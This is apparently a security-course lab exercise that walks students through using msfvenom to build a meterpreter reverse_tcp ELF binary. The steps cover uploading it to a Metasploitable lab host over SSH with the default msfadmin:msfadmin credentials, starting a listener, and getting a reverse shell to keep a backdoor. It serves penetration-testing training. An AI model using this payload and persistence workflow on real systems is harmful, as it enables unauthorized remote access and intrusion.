### Creating Malicious Binaries

In this Guided Practice you will:
- Be creating your own Malicious Binary to get a reverse shell on the Metasploitable host you scanned earlier. 
- To do this, you will be using the tool MSFvenom that we went over in class to create the binary for you.
- Remember, a common mistake that people make during this exploit, is not matching the LPORT, and the LHOST during from the `msfvenom` step to the `multi/handler` step.  

**Instructions**

Now it's your turn! In this Guided Practice you will create a malicious binary to get a reverse shell on the `10.10.10.100` host that you scanned earlier. Although this is a machine that we have exploited in the past, we want to maintain a backdoor or persistence, to revisit the machine at any given time. 

MSFvenom is a tool that will create the malicious binaries for you. In case you do not remember the correct syntax refer to the example below:

`msfvenom --arch x86 --platform <insert OS here> --payload <insert OS here>/x86/meterpreter/reverse_tcp LHOST=<insert your IP address> LPORT=<insert lport number> --format elf -o <filename>`


- - -

**Steps**

Complete the following:

- Create your executable.
- Upload your payload.
- Start a listener.
- SSH into the `10.10.10.100` host, using the credentials we discovered during the past week (msfadmin:msfadmin). 
- Execute the payload. 
  - **Note:** Remember to change the permissions once it has been uploaded. 

The Guided Practice uses the same lab environment as the previous activities. 
